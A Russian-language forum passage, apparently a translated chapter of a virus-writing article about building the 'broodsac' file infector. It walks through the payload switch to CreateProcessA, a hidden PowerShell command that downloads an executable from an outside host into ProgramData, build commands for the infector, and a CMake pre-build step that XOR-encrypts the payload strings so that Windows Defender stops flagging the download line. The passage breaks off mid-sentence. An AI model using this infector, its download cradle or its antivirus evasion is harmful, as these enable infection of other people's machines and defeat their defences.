–∑–∞–º–µ—á–µ–Ω–æ, —á—Ç–æ –∫–æ–≥–¥–∞ ShellExecuteA –∏ URLDownloadToFileA –≤—ã–ø–æ–ª–Ω—è–ª–∏—Å—å –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∫–∞—Ç–∞–ª–æ–≥–∞ TLS, –æ–Ω–∏ –∑–∞–≤–∏—Å–∞–ª–∏. –¢–∞–∫–∂–µ –±—ã–ª–æ –æ—Ç–º–µ—á–µ–Ω–æ, —á—Ç–æ –ø—Ä–æ—Ü–µ—Å—Å –ø–æ–ø—ã—Ç–∞–ª—Å—è —Å–æ–∑–¥–∞—Ç—å –ø–æ—Ç–æ–∫ –ø–µ—Ä–µ–¥ –∑–∞–≤–∏—Å–∞–Ω–∏–µ–º. –≠—Ç–æ, –≤–µ—Ä–æ—è—Ç–Ω–æ, –æ–∑–Ω–∞—á–∞–ª–æ, —á—Ç–æ –º—ã –Ω–µ –º–æ–≥–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –Ω–∏–∫–∞–∫–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ —Å–æ–∑–¥–∞–≤–∞–ª–∏ –ø–æ—Ç–æ–∫–∏.<br />
<br />
–ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –±—ã–ª–∞ –∏–∑–º–µ–Ω–µ–Ω–∞ –Ω–∞ –Ω–µ—á—Ç–æ —á—É—Ç—å –º–µ–Ω–µ–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–µ: CreateProcessA. –•–æ—Ç—è —ç—Ç–æ –∏ –Ω–µ –Ω–µ–æ–±—ã—á–Ω–æ –¥–ª—è –Ω–∞—à–µ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, —Ç–æ, –∫–∞–∫ –º—ã –≤ –∫–æ–Ω–µ—á–Ω–æ–º –∏—Ç–æ–≥–µ —Å–∫–∞—á–∏–≤–∞–ª–∏ –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ –±—ã–ª–æ –Ω–µ–æ–±—ã—á–Ω—ã–º. CreateProcessA –≤ –∫–æ–Ω–µ—á–Ω–æ–º –∏—Ç–æ–≥–µ –≤—ã–∑—ã–≤–∞–µ—Ç NtCreateProcess, —Ñ—É–Ω–∫—Ü–∏—é ntdll.dll, –∫–æ—Ç–æ—Ä–∞—è, –≤ –∫–æ–Ω–µ—á–Ω–æ–º –∏—Ç–æ–≥–µ, –∑–∞–≤–µ—Ä—à–∞–µ—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ —è–¥—Ä–∞. –≠—Ç–æ, –Ω–µ—Å–æ–º–Ω–µ–Ω–Ω–æ, –±—É–¥–µ—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ –¥–ª—è –ø–æ—Ç–æ–∫–æ–≤ –≤ –Ω–∞—à–µ–º –∫–∞—Ç–∞–ª–æ–≥–µ TLS. –¢–∞–∫ –∫–∞–∫ –∂–µ –º—ã –≤ –∫–æ–Ω–µ—á–Ω–æ–º –∏—Ç–æ–≥–µ –∑–∞–≥—Ä—É–∑–∏–ª–∏ –Ω–∞—à—É –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É? –í—ã–∑–æ–≤–æ–º Powershell.<br />
<br />
–ö–æ–Ω–µ—á–Ω–æ, —ç—Ç–æ –∑–∞–±–∞–≤–Ω–æ, –∫–æ–≥–¥–∞ shell-–∫–æ–¥ –¥–µ–ª–∞–µ—Ç –≤–Ω–µ—à–Ω–∏–π –≤—ã–∑–æ–≤ –∫ Powershell, –∫–æ–≥–¥–∞ API –Ω–∞—Ö–æ–¥–∏—Ç—Å—è —É –≤–∞—Å –ø–æ–¥ —Ä—É–∫–æ–π, –Ω–µ —Ç–∞–∫ –ª–∏? –¢–∞–∫–æ–≤–∞ –ø—Ä–∏—Ä–æ–¥–∞ —Ö–∞–∫–µ—Ä—Å—Ç–≤–∞ ‚Äî —Å—Ç–æ–ª–∫–Ω—É–≤—à–∏—Å—å —Å –≤—ã–∑–æ–≤–æ–º, –º—ã –æ—Ç–∫–ª–∏–∫–∞–µ–º—Å—è –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–º–∏ —Ä–µ—à–µ–Ω–∏—è–º–∏, –Ω–µ—Å–º–æ—Ç—Ä—è –Ω–∞ –Ω–∞—à–∏ –º–Ω–µ–Ω–∏—è, –µ—Å–ª–∏ —ç—Ç–æ –ø—Ä–æ—Å—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç.<br />
<br />
–¢–µ–º –Ω–µ –º–µ–Ω–µ–µ, —ç—Ç–æ —Ä–µ—à–µ–Ω–∏–µ –ø–æ—Ç—Ä–µ–±–æ–≤–∞–ª–æ –∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω–æ–π –ø–µ—Ä–µ—Ä–∞–±–æ—Ç–∫–∏ –∫–æ–¥–∞. C-–ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ø–µ—Ä–µ–ø–∏—Å–∞–Ω–∞, –ø–µ—Ä–µ–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–∞, –ø–µ—Ä–µ–≤–µ–¥–µ–Ω–∞ –≤ assembly, —ç—Ç–∏ assembly-—Ñ–∞–π–ª—ã —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω—ã –∏ –≤—Å—Ç–∞–≤–ª–µ–Ω—ã –æ–±—Ä–∞—Ç–Ω–æ –≤ –Ω–∞—à –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—å. –ü–æ —Å—É—Ç–∏, –º—ã –≤—ã–Ω—É–∂–¥–µ–Ω—ã –≤–µ—Ä–Ω—É—Ç—å—Å—è –∫ –Ω–∞—á–∞–ª—É –Ω–∞—à–∏—Ö –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω—ã—Ö —à–∞–≥–æ–≤ –∏ –ø—Ä–æ–¥–µ–ª–∞—Ç—å –ø—É—Ç—å –Ω–∞–∑–∞–¥ –∫ –Ω–∞—à–µ–º—É –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—é. –≠—Ç–æ –º–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏, –∏ –µ—â—ë –±–æ–ª—å—à–µ —à–∞–≥–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –Ω—É–∂–Ω–æ –ø—Ä–æ–π—Ç–∏ –±–µ–∑ —É–ø—Ä–æ—â–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä–æ–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç —Å–∏—Å—Ç–µ–º–∞ —Å–±–æ—Ä–∫–∏!<br />
<br />
–ù–æ –∫–æ–≥–¥–∞ –≤—Å—ë —Å–≤—è–∑–∞–Ω–æ –≤–º–µ—Å—Ç–µ, –µ–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω–æ–µ –≤—Ä–µ–º—è, –∫–æ—Ç–æ—Ä–æ–µ –º—ã —Ç—Ä–∞—Ç–∏–º, ‚Äî —ç—Ç–æ –ø—Ä–æ—Å—Ç–æ —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç –≥—Ä–∞–±–ª–µ–π –≤ –Ω–∞—à–µ–º –¥–∑–µ–Ω-—Å–∞–¥—É: –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –∞–Ω–∞–ª–∏–∑. –í—Å—ë –ø–æ—Ç–æ–º—É, —á—Ç–æ –Ω–∞—à–∞ —Å–∏—Å—Ç–µ–º–∞ —Å–±–æ—Ä–∫–∏ –¥–µ–ª–∞–µ—Ç –Ω–∞—à–∏ —Å–ª–æ–∂–Ω—ã–µ –∞–±—Å—Ç—Ä–∞–∫—Ç–Ω—ã–µ —à–∞–≥–∏ –ø—Ä–æ–≤–µ—Ä–∫–∏ –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ –ø—Ä–æ—Å—Ç—ã–º–∏:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>$ cd infection/c/build
$ cmake --build ./
$ ./Debug/infection_c.exe # –µ—Å—Ç—å –æ–≤–µ—á–∫–∏? –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞
$ cmake --build ./ --config Release # –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞ –≤ asm
$ cd ../../asm/32/build
$ cmake --build ./
$ ./Debug/infection_asm_32.exe # –µ—Å—Ç—å –æ–≤–µ—á–∫–∏? –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞
$ cd ../../64/build
$ cmake --build ./
$ ./Debug/infection_asm_64.exe # –µ—Å—Ç—å –æ–≤–µ—á–∫–∏? –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞
$ cd ../../../../build # –ø—Ä–æ–≤–µ—Ä–∫–∞: –Ω–∞—Å—Ç—Ä–æ–µ–Ω –ª–∏ Debug?
$ cmake --build ./
$ ./Debug/broodsac.exe # –ø–æ –∫—Ä–∞–π–Ω–µ–π –º–µ—Ä–µ, –µ—Å–ª–∏ –æ—à–∏–±–∫–∞, –≤—ã –ø—Ä–æ—Å—Ç–æ –ø–æ–ª—É—á–∏—Ç–µ –æ–≤–µ—á–µ–∫</code></pre>
	</div>
</div><br />
–ö–∞–∂–¥—ã–π —à–∞–≥, –≥–¥–µ —á—Ç–æ-—Ç–æ –º–æ–∂–µ—Ç –ø–æ–π—Ç–∏ –Ω–µ —Ç–∞–∫, –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω –≤ —Å–≤–æ—ë –º–µ—Å—Ç–æ, —É–ø—Ä–∞–≤–ª—è–µ–º–æ–µ –ø–æ-—Å–≤–æ–µ–º—É. –ö–∞–∂–¥–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ–µ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –Ω–∞—à–µ–≥–æ –≤–∏—Ä—É—Å–∞, –æ—Ç –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –¥–æ –¥–æ—Å—Ç–∞–≤–∫–∏, –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏—Ä—É–µ—Ç—Å—è –∏ –ø–ª–∞–≤–Ω–æ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç –¥—Ä—É–≥ –≤ –¥—Ä—É–≥–∞. –ö–æ–≥–¥–∞ —á—Ç–æ-—Ç–æ –∏–¥—ë—Ç –Ω–µ —Ç–∞–∫ –Ω–∞ –ª—é–±–æ–º —ç—Ç–∞–ø–µ —ç—Ç–æ–π —Ü–µ–ø–æ—á–∫–∏, –º—ã —Ç–æ—á–Ω–æ –∑–Ω–∞–µ–º, –≥–¥–µ –Ω–∞—á–∞—Ç—å –∑–∞–Ω–æ–≤–æ, –∏ –º–æ–∂–µ–º –±—ã—Å—Ç—Ä–æ –¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å –∏ —Ä–µ—à–∞—Ç—å –ø—Ä–æ–±–ª–µ–º—É.<br />
<br />
–ë—ã—Ç—å –≥–∏–±–∫–∏–º, –∫–æ–≥–¥–∞ –¥–µ–ª–æ –¥–æ—Ö–æ–¥–∏—Ç –¥–æ —É—Å—Ç—Ä–∞–Ω–µ–Ω–∏—è –¥–µ–º–æ–Ω–æ–≤ –±–∞–≥–æ–≤, —ç—Ç–æ –æ–¥–Ω–æ, –Ω–æ —á—Ç–æ –Ω–∞—Å—á—ë—Ç –¥–µ–º–æ–Ω–æ–≤ —ç–∫—Å—Ç—Ä–µ–Ω–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ —Ñ—É–Ω–∫—Ü–∏–∏? –≠—Ç–æ –Ω–µ –ø—Ä–æ—Å—Ç–æ –¥–∞–≤–ª–µ–Ω–∏–µ —Å–æ —Å—Ç–æ—Ä–æ–Ω—ã —Ä—É–∫–æ–≤–æ–¥—Å—Ç–≤–∞ –≤—ã–∑—ã–≤–∞–µ—Ç —Ç–∞–∫–∏–µ —Å–∫–∞—á–∫–∏ –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ, –Ω–æ –∏ –Ω–µ–æ–∂–∏–¥–∞–Ω–Ω–∞—è –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å.<br />
<br />
<b>--[ 5.2 –ê–Ω—Ç–∏–≤–∏—Ä—É—Å –ª–æ–≤–∏—Ç –≤–∏—Ä—É—Å</b><br />
<br />
–ú–µ–Ω—è –æ—á–µ–Ω—å —Ä–∞–∑–≤–µ—Å–µ–ª–∏–ª–æ, –∫–æ–≥–¥–∞ —è –∑–∞–º–µ—Ç–∏–ª, —á—Ç–æ –æ–≤–µ—á–∫–∞ –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç—Å—è –∫–∞–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û. –õ—é–±–æ–ø—ã—Ç–Ω–æ, –≤–µ–¥—å —Å–∞–º–∞ –æ–≤–µ—á–∫–∞ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏ –±—ã–ª–∞ –±–µ–∑–æ–±–∏–¥–Ω–æ–π ‚Äî –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—å –∏ –∏–Ω—Ñ–µ–∫—Ü–∏—è –±—ã–ª–∏ —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º –ü–û. –ò–∑–Ω–∞—á–∞–ª—å–Ω–æ —è –¥–æ–±–∞–≤–∏–ª –µ—ë –≤ –±–µ–ª—ã–π —Å–ø–∏—Å–æ–∫ –≤ Windows Defender, –ø–æ–∫–∞ —Ä–∞–±–æ—Ç–∞–ª, –∏ –æ—Å–æ–±–æ –Ω–µ –∑–∞–¥—É–º—ã–≤–∞–ª—Å—è –æ–± —ç—Ç–æ–º, —è –∏—Å–ø—Ä–∞–≤–ª—é —ç—Ç–æ –ø–æ–∑–∂–µ. –í –∫–æ–Ω—Ü–µ –∫–æ–Ω—Ü–æ–≤, –º–Ω–µ –ø—Ä–∏—à–ª–æ—Å—å —Å—Ç–æ–ª–∫–Ω—É—Ç—å—Å—è —Å —Ä–µ–∞–ª—å–Ω–æ—Å—Ç—å—é –∏ –ø–æ–Ω—è—Ç—å, –ø–æ—á–µ–º—É –º–æ–π –≤–∏—Ä—É—Å –±—ã–ª –æ–±–Ω–∞—Ä—É–∂–µ–Ω, –¥–∞–∂–µ –µ—Å–ª–∏ –æ–≤–µ—á–∫–∞, –Ω–∞ —É–¥–∏–≤–ª–µ–Ω–∏–µ, –±—ã–ª–∞ –±–µ–∑–æ–±–∏–¥–Ω–æ–π.<br />
<br />
–ü–æ–¥—Å–∫–∞–∑–∫–∏, –∫–æ—Ç–æ—Ä—ã–µ –º—ã –ø–æ–ª—É—á–∞–ª–∏ –æ—Ç Windows Defender, —É–∫–∞–∑—ã–≤–∞–ª–∏ –Ω–∞ —Ç–æ, —á—Ç–æ —ç—Ç–æ –∫–∞–∫–æ–π-—Ç–æ —Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π –µ–≥–æ —Å—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç, –∏ —á—Ç–æ —Å–∏–≥–Ω–∞—Ç—É—Ä–∞, –Ω–∞ –∫–æ—Ç–æ—Ä—É—é –æ–Ω –Ω–∞—Ç–∞–ª–∫–∏–≤–∞–µ—Ç—Å—è, –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è &quot;Trojan-Script/Wacatac.B!ml.&quot; –ò—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ —ç—Ç–æ–π —Å–∏–≥–Ω–∞—Ç—É—Ä—ã –Ω–∏—á–µ–≥–æ –Ω–∞–º –Ω–µ –¥–∞–ª–æ, –∫–∞–∫ —ç—Ç–æ —á–∞—Å—Ç–æ –±—ã–≤–∞–µ—Ç —Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–º–∏ —Å–∏–≥–Ω–∞—Ç—É—Ä–∞–º–∏. –ú—ã —É–∑–Ω–∞–ª–∏ —Ç–æ–ª—å–∫–æ, —á—Ç–æ –≤—Å–µ —Ä–∞–∑–¥—Ä–∞–∂–µ–Ω—ã —Ç–µ–º, —á—Ç–æ –≤—Å–µ –≤–∏–¥—ã —Å–ª—É—á–∞–π–Ω—ã—Ö –±–µ–∑–æ–±–∏–¥–Ω—ã—Ö –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤ –ø–æ–º–µ—á–∞—é—Ç—Å—è –∫–∞–∫ Wacatac. –ù–∞—Å –ø–æ–¥–≤–µ–ª–∞ –ª–æ–∂–Ω–∞—è —Å—Ä–∞–±–æ—Ç–∫–∞? –ü–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ –Ω–µ–ª–æ–≤–∫–æ.<br />
<br />
–í –ª—é–±–æ–º —Å–ª—É—á–∞–µ, —Å—Ç–∞–ª–æ —è—Å–Ω–æ, —á—Ç–æ —Å —É—á—ë—Ç–æ–º –ø–æ–¥—Å–∫–∞–∑–∫–∏ –æ —Å–∫—Ä–∏–ø—Ç–µ, —Å—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏–µ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏–ª–æ –∏–∑-–∑–∞ –Ω–∞—à–µ–≥–æ –æ–¥–Ω–æ—Å—Ç—Ä–æ—á–Ω–∏–∫–∞ Powershell. –Ø –¥–∞–∂–µ –Ω–µ –ø—ã—Ç–∞–ª—Å—è –∫–∞–∫–∏–º-–ª–∏–±–æ –æ–±—Ä–∞–∑–æ–º –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥—É, —Ç–∞–∫ —á—Ç–æ –Ω–µ—É–¥–∏–≤–∏—Ç–µ–ª—å–Ω–æ, —á—Ç–æ –µ—ë –≤ –∫–æ–Ω—Ü–µ –∫–æ–Ω—Ü–æ–≤ –ø–æ–π–º–∞–ª–∏. –ú—ã –ø–æ–∑–∂–µ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ –±–ª–∞–≥–æ–¥–∞—Ä—è –Ω–µ–∫–æ—Ç–æ—Ä—ã–º –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è–º —Å–∏–≥–Ω–∞—Ç—É—Ä Windows Defender[5], —á—Ç–æ –Ω–∞—à–∞ —Å—Ç—Ä–æ–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –±—ã–ª–∞ –∞–±—Å–æ–ª—é—Ç–Ω–æ —Ç–∞–º, –≥–¥–µ-—Ç–æ, —Ç–∞–∫ —á—Ç–æ —ç—Ç–æ —è–≤–Ω–æ –±—ã–ª –≤–∏–Ω–æ–≤–Ω–∏–∫. –≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ —Ç–µ–ø–µ—Ä—å –Ω–∞–º –Ω—É–∂–Ω–æ –±—ã–ª–æ –µ—ë –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞—Ç—å.<br />
<br />
–ö–æ–Ω–µ—á–Ω–æ, –º—ã –º–æ–≥–ª–∏ –±—ã —Å–¥–µ–ª–∞—Ç—å —ç—Ç–æ —Ä–∞–∑ –∏ –Ω–∞–≤—Å–µ–≥–¥–∞ –∏ –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞—Ç—å –µ—ë –ø—Ä—è–º–æ –≤ assembly-—Ñ–∞–π–ª—ã, –Ω–æ –≥–¥–µ –≤ —ç—Ç–æ–º –≤–µ—Å–µ–ª—å–µ? –û–Ω–∏ –ø—Ä–æ—Å—Ç–æ –ø–æ–º–µ—Ç—è—Ç –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π –±–ª–æ–∫ –∏ —É—Å–ø–æ–∫–æ—è—Ç—Å—è! –ì–¥–µ –≤ —ç—Ç–æ–º –≥–∏–±–∫–æ—Å—Ç—å? –ò —á—Ç–æ, –µ—Å–ª–∏ –º–Ω–µ –Ω—É–∂–Ω–æ –±—É–¥–µ—Ç –ø–æ–ª–Ω–æ—Å—Ç—å—é –∏–∑–º–µ–Ω–∏—Ç—å –∫–æ–Ω–µ—á–Ω—É—é –∫–æ–º–∞–Ω–¥—É? –ö–∞–∫ —è –º–æ–≥—É —Å–¥–µ–ª–∞—Ç—å —ç—Ç–æ –∫–∞–∫ –º–æ–∂–Ω–æ –º–µ–Ω–µ–µ –±–æ–ª–µ–∑–Ω–µ–Ω–Ω—ã–º –¥–ª—è —Å–µ–±—è –∏ –¥—Ä—É–≥–∏—Ö, –∫—Ç–æ –∑–∞—Ö–æ—á–µ—Ç –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å —ç—Ç–æ—Ç –∫–æ–¥?<br />
<br />
–ü—Ä–µ–ª–µ—Å—Ç—å —Ö–æ—Ä–æ—à–µ–π —Å–∏—Å—Ç–µ–º—ã —Å–±–æ—Ä–∫–∏ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ —Å–∫—Ä–æ–º–Ω–æ –ø–µ—Ä–µ–¥–∞—Ç—å –∫–æ–º–∞–Ω–¥—ã —Å–±–æ—Ä–∫–∏ –¥—Ä—É–≥–æ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É –Ω–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã—Ö —ç—Ç–∞–ø–∞—Ö —Å–±–æ—Ä–∫–∏. –î–∞–≤–∞–π—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º –Ω–∞ –∫–æ–¥ –≤ –Ω–∞—à–∏—Ö –ø–æ–ª–µ–∑–Ω—ã—Ö –Ω–∞–≥—Ä—É–∑–∫–∞—Ö, –∫–æ—Ç–æ—Ä—ã–π —à–∏—Ñ—Ä—É–µ—Ç —Å—Ç—Ä–æ–∫–∏:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>add_custom_command(TARGET infection_asm_64
  PRE_BUILD
  COMMAND powershell ARGS
  -ExecutionPolicy bypass
  -File &quot;${CMAKE_CURRENT_SOURCE_DIR}/../strings.ps1&quot;
  -payload_program &quot;\\??\\C:\\ProgramData\\sheep.exe&quot;
  -payload_command &quot;sheep&quot;
  -download_program &quot;\\??\\C:\\Windows\\System32\\WindowsPowerShell\
\\v1.0\\powershell.exe&quot;
  -download_command &quot;powershell -ExecutionPolicy bypass \
-WindowStyle hidden \
-Command \&quot;(New-Object System.Net.WebClient).DownloadFile(\
&#039;https://amethyst.systems/sheep.dat&#039;, &#039;C:\\ProgramData\\sheep.exe&#039;)\&quot;&quot;
  -output &quot;${CMAKE_CURRENT_BINARY_DIR}/$&lt;CONFIG&gt;/infection_strings.asm&quot;
  VERBATIM)</code></pre>
	</div>
</div><br />
Powershell –±—ã–ª –≤—ã–±—Ä–∞–Ω –ø—Ä–æ—Å—Ç–æ –ø–æ—Ç–æ–º—É, —á—Ç–æ —Å –Ω–∏–º –ø—Ä–æ—â–µ —Ä–∞–±–æ—Ç–∞—Ç—å, —á–µ–º —Å–æ —Å—Ç–∞—Ä—ã–º CMD. –ë—ã–ª —Å–æ–∑–¥–∞–Ω –ø—Ä–æ—Å—Ç–æ–π —Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤—ã–≤–∞–ª –º–Ω–æ–≥–∏–µ —Å—Ç—Ä–æ–∫–∏, –∫–æ—Ç–æ—Ä—ã–µ –Ω–∞–º –Ω—É–∂–Ω–æ –±—ã–ª–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å, –≤—ã–±–∏—Ä–∞–ª —Å–ª—É—á–∞–π–Ω—ã–π –∫–ª—é—á, –∞ –∑–∞—Ç–µ–º –≤—ã–ø–æ–ª–Ω—è–ª —Ç—Ä–∞–¥–∏—Ü–∏–æ–Ω–Ω–æ–µ XOR-—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç—Ä–æ–∫–∏. –°–∫—Ä–∏–ø—Ç —Å–æ–∑–¥–∞—ë—Ç —Ñ–∞–π–ª –≤–∫–ª—é—á–µ–Ω–∏—è NASM –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –µ–≥–æ –≤ –∫–∞—Ç–∞–ª–æ–≥–µ –±–∏–Ω–∞—Ä–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ —Å–∏—Å—Ç–µ–º—ã —Å–±–æ—Ä–∫–∏ ‚Äî –ø–æ —Å—É—Ç–∏, —É–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω—ã–π –∫–∞—Ç–∞–ª–æ–≥ –¥–ª—è –ª—é–±—ã—Ö —Å–æ–∑–¥–∞–Ω–Ω—ã—Ö –∞—Ä—Ç–µ—Ñ–∞–∫—Ç–æ–≤. –ú—ã –∑–∞—Ç–µ–º –≤–∫–ª—é—á–∞–µ–º —ç—Ç–æ—Ç –∫–∞—Ç–∞–ª–æ–≥ –≤ –¥–∏—Ä–µ–∫—Ç–∏–≤—ã –∞—Å—Å–µ–º–±–ª–µ—Ä–∞, —á—Ç–æ–±—ã –Ω–∞—à–∏ assembly-—Ñ–∞–π–ª—ã –º–æ–≥–ª–∏ –µ–≥–æ –≤–∏–¥–µ—Ç—å:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>target_include_directories(infection_asm_64 PUBLIC
  &quot;${CMAKE_CURRENT_SOURCE_DIR}&quot;
  &quot;${CMAKE_CURRENT_BINARY_DIR}/$&lt;CONFIG&gt;&quot;)</code></pre>
	</div>
</div><br />
–ö–∞–∫ —Ç–≤–æ—Ä—Ü—ã, —á–µ–π —Ö–æ–ª—Å—Ç ‚Äî —Å–æ–º–Ω–∏—Ç–µ–ª—å–Ω—ã–π –º–∞—à–∏–Ω–Ω—ã–π –∫–æ–¥, –º—ã, –±–µ–∑ —Å–æ–º–Ω–µ–Ω–∏—è, –º–æ–∂–µ–º —É–≤–∏–¥–µ—Ç—å –ø—Ä–∏–≤–ª–µ–∫–∞—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∏ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏, –∫–æ—Ç–æ—Ä—ã–µ —ç—Ç–æ –¥–∞—ë—Ç. –ï—Å–ª–∏ –≤—ã –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ —á—É–≤—Å—Ç–≤—É–µ—Ç–µ —Å–µ–±—è –¥–µ—Ä–∑–∫–æ, –≤—ã –¥–∞–∂–µ –º–æ–∂–µ—Ç–µ –º—É—Ç–∏—Ä–æ–≤–∞—Ç—å –æ–±—ä–µ–∫—Ç—ã COFF –∏ –≤–∫–ª—é—á–∞—Ç—å –∏—Ö –≤ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫ —á–µ—Ä–µ–∑ CMake! –ò–∑–º–µ–Ω–µ–Ω–∏–µ –æ–±—ä–µ–∫—Ç–æ–≤ –Ω–∞–ø—Ä—è–º—É—é –±—É–¥–µ—Ç –≤—ã–≥–ª—è–¥–µ—Ç—å –ø—Ä–∏–º–µ—Ä–Ω–æ 